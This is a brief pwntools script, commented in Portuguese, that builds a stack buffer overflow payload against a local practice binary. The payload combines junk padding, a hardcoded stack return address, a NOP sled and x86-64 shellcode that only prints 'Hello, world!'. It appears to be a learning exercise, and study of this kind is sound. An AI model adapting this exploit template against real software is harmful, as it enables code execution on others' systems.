from pwn import *
filename = "./overflow"
p = process(filename)
p = ELF(filename)
f = open("shellcode", "wb") 
junk = b"A"*20              # Junk até sobreescrever RSP
stack = p64(0x7fffffffe3d0) # Pulando pra stack (no gdb por conta do ASLR)
shellcode = b"\xeb\x1e\x5e\x48\x31\xc0\xb0\x01\x48\x89\xc7\x48\x89\xfa\x48\x83\xc2\x0e\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\xe8\xdd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21\x0a" # Shellcode sem nullbytes S2

nopchain = b"\x90"*20 # nopslide, instruções que não fazem nada, alinhamento do payload

exploit = junk + stack + nopchain + shellcode
f.write(exploit)

p.process()
